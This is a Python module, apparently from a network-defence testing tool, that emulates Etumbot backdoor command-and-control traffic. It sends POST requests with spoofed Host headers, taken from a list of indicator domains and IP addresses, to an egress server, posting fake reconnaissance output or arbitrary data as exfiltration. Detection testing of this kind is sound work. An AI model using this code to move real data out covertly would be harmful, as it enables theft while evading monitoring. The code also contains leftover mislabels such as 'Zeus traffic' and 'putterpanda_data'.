'''

This module generates Zeus traffic.

Resources:
https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/APT/etumbot.profile

'''

import random
import sys
import urllib
import urllib2


class Actor:

    def __init__(self, cli_object):
        self.cli = "etumbot"
        self.description = "etumbot backdoor"
        self.type = "malware"
        self.server_requirement = "http"
        self.egress_server = cli_object.ip
        self.domains = [
            '200.27.173.58', '200.42.69.140', '92.54.232.42', '133.87.242.63',
            '98.188.111.244', 'intro.sunnyschool.com.tw', '143.89.145.156',
            '198.209.212.82', '143.89.47.132', '196.1.199.15',
            'wwap.publiclol.com', '59.0.249.11', '190.16.246.129',
            '211.53.164.152', 'finance.yesplusno.com']
        self.post_data = [
            {'etumbot_id': 'uid=0(root) gid=0(root) groups=0(root)'},
            {'etumbot_whoami': 'root'}, {'etumbot_dir': 'C:\\, C:\\Windows'},
            {'etumbot_ps': 'svchost.exe, spoolsvc.exe, explorer.exe, iexplorer.exe'},
            {'etumbot_ipconfig': '192.168.1.83 255.255.255.0 192.168.1.1'},
            {'etumbot_ping': 'google.com time=11.6, 19.1, 12.8, 20'}]
        self.uris = [
            ''
            ]


    def emulate(self, data_to_exfil=None):

        # headers that are used in get requests
        etumbot_headers = {
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)",
            "Connection": "Keep-Alive",
            "Referrer": "http://www.google.com/",
            "Pragme": "no-cache",
            "Cache-Control": "no-cache",
            "Accept": "text/html,application/xhtml+xml,application/xml,q=0.9,*/*;q=0.8"
        }

        selected_domain = random.choice(self.domains)
        etumbot_headers['Host'] = selected_domain

        get_request = urllib2.Request(
            "http://" + self.egress_server + "/home/index.asp?typeid=13",
            headers=etumbot_headers)

        try:
            urllib2.urlopen(get_request)
        except urllib2.URLError:
            print "[*] Error: Cannot connect to etumbot data exfil server!"
            print "[*] Error: Possible firewall, or proxy prventing this?"
            sys.exit(1)

        # Iterate over get and post request 5 times
        for times_requested in xrange(1, 6):
            selected_domain = random.choice(self.domains)
            etumbot_headers['Host'] = selected_domain
            etumbot_uri = random.choice(self.uris)

            # Determining which data is being sent out by agent
            if data_to_exfil is None:
                  posted_data = random.choice(self.post_data)
            else:
                  posted_data = {'putterpanda_data': data_to_exfil}

            # UrlEncode and send the data out
            posted_data = urllib.urlencode(posted_data)
            post_req = urllib2.Request(
                "http://" + self.egress_server + etumbot_uri, posted_data, headers=etumbot_headers)

            try:
                urllib2.urlopen(post_req)
            except urllib2.URLError:
                print "[*] Error: Cannot connect to etumbot data exfil server!"
                print "[*] Error: Possible firewall, or proxy prventing this?"
                sys.exit(1)

        print "[*] INFO: Etumbot C2 comms complete!"

        return

    def gen_numbers(self, num=5):
        if num == 5:
            return random.randint(10000, 99999)
        elif num == 2:
            return random.randint(10, 99)
        elif num == 6:
            return random.randint(100000, 999999)
        elif num == 7:
            return random.randint(1000000, 9999999)
        else:
            print "odd error?"
            sys.exit()
        return

    def random_letters(self, total=24):
        random_string = ''.join(
            random.choice('ABCDEFGHIJKLMNOP') for x in range(total))
        return random_string
